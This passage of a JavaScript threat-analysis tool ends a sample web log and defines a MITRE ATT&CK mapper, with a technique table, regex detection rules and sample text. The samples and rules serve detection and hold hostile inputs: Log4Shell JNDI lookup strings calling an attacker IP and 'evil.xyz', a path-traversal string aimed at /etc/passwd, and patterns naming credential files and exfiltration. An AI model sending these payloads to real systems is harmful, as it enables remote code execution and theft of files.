91.108.4.155  - - [10/Apr/2024:02:16:02 +0000] "GET /admin HTTP/1.1" 404 214 "-" "zgrab/0.x"
91.108.4.155  - - [10/Apr/2024:02:16:03 +0000] "GET /wp-admin HTTP/1.1" 404 214 "-" "zgrab/0.x"
185.220.101.47 - - [10/Apr/2024:16:34:01 +0000] "POST /upload HTTP/1.1" 200 2621440 "-" "curl/7.84.0"
185.220.101.47 - - [10/Apr/2024:16:35:00 +0000] "POST /cmd?c=${jndi:ldap://185.220.101.47:1389/a} HTTP/1.1" 500 0 "-" "Log4Shell-Exploit/1.0"`;

  return { analyze, SAMPLE };
})();

/* ═══════════════════════════════════════════════════════
   MOD-10 — MITRE ATT&CK MAPPER v1.0
   محرك MITRE ATT&CK — ربط المؤشرات بالإطار
═══════════════════════════════════════════════════════ */
const ATTACKEngine = (() => {

  /* Curated ATT&CK technique database */
  const TECHNIQUES = {
    'T1566':   { name:'Phishing',                      tactic:'TA0001',  desc:'رسائل بريد إلكتروني مزيفة لاختراق الهدف' },
    'T1566.001':{ name:'Spearphishing Attachment',     tactic:'TA0001',  desc:'ملفات مرفقة خبيثة في رسائل موجهة' },
    'T1566.002':{ name:'Spearphishing Link',           tactic:'TA0001',  desc:'روابط خبيثة في رسائل موجهة' },
    'T1598':   { name:'Phishing for Information',      tactic:'TA0043',  desc:'جمع المعلومات عبر التصيد' },
    'T1190':   { name:'Exploit Public-Facing App',     tactic:'TA0001',  desc:'استغلال ثغرات التطبيقات العامة' },
    'T1078':   { name:'Valid Accounts',                tactic:'TA0001',  desc:'استخدام حسابات مشروعة مسروقة' },
    'T1059':   { name:'Command & Scripting Interpreter',tactic:'TA0002', desc:'تنفيذ أوامر عبر PowerShell/CMD/Bash' },
    'T1059.001':{ name:'PowerShell',                   tactic:'TA0002',  desc:'استخدام PowerShell لتنفيذ كود خبيث' },
    'T1059.003':{ name:'Windows Command Shell',        tactic:'TA0002',  desc:'cmd.exe لتنفيذ أوامر خبيثة' },
    'T1027':   { name:'Obfuscated Files/Information',  tactic:'TA0005',  desc:'تشفير/ترميز الكود الخبيث (Base64)' },
    'T1027.010':{ name:'Command Obfuscation',          tactic:'TA0005',  desc:'تشويش الأوامر لتجاوز الكشف' },
    'T1547.001':{ name:'Registry Run Keys / Startup',  tactic:'TA0003',  desc:'Persistence عبر Run Keys في Registry' },
    'T1071':   { name:'Application Layer Protocol',    tactic:'TA0011',  desc:'اتصال C2 عبر HTTP/HTTPS' },
    'T1041':   { name:'Exfiltration Over C2 Channel',  tactic:'TA0010',  desc:'تسريب البيانات عبر قناة C2' },
    'T1486':   { name:'Data Encrypted for Impact',     tactic:'TA0040',  desc:'تشفير البيانات (Ransomware)' },
    'T1657':   { name:'Financial Theft',               tactic:'TA0040',  desc:'سرقة مالية أو طلب فدية' },
    'T1110':   { name:'Brute Force',                   tactic:'TA0006',  desc:'محاولات متعددة لاختراق كلمة المرور' },
    'T1110.001':{ name:'Password Guessing',            tactic:'TA0006',  desc:'تخمين كلمات المرور' },
    'T1046':   { name:'Network Service Discovery',     tactic:'TA0007',  desc:'مسح خدمات الشبكة' },
    'T1592':   { name:'Gather Victim Host Info',       tactic:'TA0043',  desc:'جمع معلومات عن الهدف' },
    'T1189':   { name:'Drive-by Compromise',           tactic:'TA0001',  desc:'اختراق عبر زيارة موقع خبيث' },
    'T1203':   { name:'Exploitation for Client Execution',tactic:'TA0002',desc:'استغلال ثغرة في تطبيق لتنفيذ كود' },
    'T1539':   { name:'Steal Web Session Cookie',      tactic:'TA0006',  desc:'سرقة ملفات تعريف الارتباط' },
    'T1552':   { name:'Unsecured Credentials',         tactic:'TA0006',  desc:'الوصول لبيانات اعتماد غير محمية' },
    'T1560':   { name:'Archive Collected Data',        tactic:'TA0009',  desc:'ضغط وتأرشفة البيانات قبل التسريب' },
    'T1005':   { name:'Data from Local System',        tactic:'TA0009',  desc:'جمع البيانات من النظام المحلي' },
    'T1491':   { name:'Defacement',                    tactic:'TA0040',  desc:'تشويه مواقع الويب' },
    'T1498':   { name:'Network Denial of Service',     tactic:'TA0040',  desc:'هجمات حجب الخدمة' },
  };

  const TACTICS = {
    'TA0043':{ name:'Reconnaissance',  color:'#8b5cf6', ar:'الاستطلاع' },
    'TA0001':{ name:'Initial Access',  color:'#ef4444', ar:'الوصول الأولي' },
    'TA0002':{ name:'Execution',       color:'#f43f5e', ar:'التنفيذ' },
    'TA0003':{ name:'Persistence',     color:'#f59e0b', ar:'الثبات' },
    'TA0004':{ name:'Privilege Esc.',  color:'#f97316', ar:'رفع الصلاحيات' },
    'TA0005':{ name:'Defense Evasion', color:'#84cc16', ar:'التهرب الدفاعي' },
    'TA0006':{ name:'Credential Access',color:'#22d3ee',ar:'الوصول للاعتمادات' },
    'TA0007':{ name:'Discovery',       color:'#0ea5e9', ar:'الاكتشاف' },
    'TA0008':{ name:'Lateral Movement',color:'#6366f1', ar:'الحركة الجانبية' },
    'TA0009':{ name:'Collection',      color:'#ec4899', ar:'جمع البيانات' },
    'TA0010':{ name:'Exfiltration',    color:'#14b8a6', ar:'التسريب' },
    'TA0011':{ name:'C2',              color:'#f59e0b', ar:'التحكم والسيطرة' },
    'TA0040':{ name:'Impact',          color:'#ef4444', ar:'الأثر والتدمير' },
  };

  /* Indicator → Technique mapping rules */
  const MAPPING_RULES = [
    { pattern:/phishing|تصيد|spear/i,                      techniques:['T1566','T1566.001','T1566.002'] },
    { pattern:/bitcoin|btc|monero|ransom|فدية/i,           techniques:['T1486','T1657'] },
    { pattern:/powershell|-enc|-nop|invoke-expression/i,   techniques:['T1059.001','T1027','T1027.010'] },
    { pattern:/cmd\.exe|rundll32|regsvr32/i,               techniques:['T1059.003'] },
    { pattern:/registry|run\s*key|hkey/i,                  techniques:['T1547.001'] },
    { pattern:/base64|encoding|obfusc/i,                   techniques:['T1027','T1027.010'] },
    { pattern:/brute\s*force|login.fail|auth.fail/i,       techniques:['T1110','T1110.001'] },
    { pattern:/sql\s*inject|union\s*select|sqlmap/i,       techniques:['T1190','T1203'] },
    { pattern:/path\s*traversal|\.\.\/|etc\/passwd/i,      techniques:['T1190'] },
    { pattern:/xss|cross.site|script.*inject/i,            techniques:['T1189','T1203'] },
    { pattern:/c2|command.*control|beacon|upload.*php/i,   techniques:['T1071','T1041'] },
    { pattern:/exfil|تسريب|data.transfer|upload.*\d+mb/i,  techniques:['T1041','T1560','T1005'] },
    { pattern:/scan|nmap|nikto|masscan|zgrab|nuclei/i,     techniques:['T1046','T1592'] },
    { pattern:/cookie|session.*steal|token.*exfil/i,       techniques:['T1539'] },
    { pattern:/credential|password|passwd|\.env/i,         techniques:['T1552'] },
    { pattern:/log4(?:shell|j)|jndi:|ldap.*exploit/i,      techniques:['T1190','T1203'] },
    { pattern:/defac|تشويه|index.*defaced/i,               techniques:['T1491'] },
    { pattern:/ddos|dos.attack|flood/i,                    techniques:['T1498'] },
  ];

  function analyze(textOrFindings) {
    const text     = typeof textOrFindings === 'string' ? textOrFindings : JSON.stringify(textOrFindings);
    const matched  = new Map();

    for (const rule of MAPPING_RULES) {
      if (rule.pattern.test(text)) {
        rule.techniques.forEach(tid => {
          if (TECHNIQUES[tid]) {
            const existing = matched.get(tid) || { ...TECHNIQUES[tid], id:tid, confidence:0, sources:[] };
            existing.confidence = Math.min(existing.confidence + 30, 95);
            matched.set(tid, existing);
          }
        });
      }
    }

    /* Group by tactic */
    const byTactic = {};
    for (const [tid, tech] of matched) {
      const ta = tech.tactic;
      if (!byTactic[ta]) byTactic[ta] = { ...TACTICS[ta], id:ta, techniques:[] };
      byTactic[ta].techniques.push({ id:tid, ...tech });
    }

    /* Kill chain stage estimation */
    const tacticOrder = ['TA0043','TA0001','TA0002','TA0003','TA0004','TA0005','TA0006','TA0007','TA0008','TA0009','TA0010','TA0011','TA0040'];
    const activeTactics = tacticOrder.filter(t => byTactic[t]);
    const killChainStage = activeTactics.length > 0 ? tacticOrder.indexOf(activeTactics[activeTactics.length-1]) : 0;

    return {
      techniques  : [...matched.values()],
      byTactic,
      total       : matched.size,
      tacticCount : Object.keys(byTactic).length,
      killChainStage,
      TACTICS,
      activeTactics
    };
  }

  const SAMPLE_TEXT = `Phishing email detected with bitcoin payment request and base64 encoded PowerShell payload.
Registry persistence via Run key. Data exfiltration through C2 channel. Brute force login attempts.
SQL injection in /api/login. Path traversal: ../../../../etc/passwd. Log4Shell: \${jndi:ldap://evil.xyz/a}`;

  return { analyze, TECHNIQUES, TACTICS, SAMPLE_TEXT };
})();
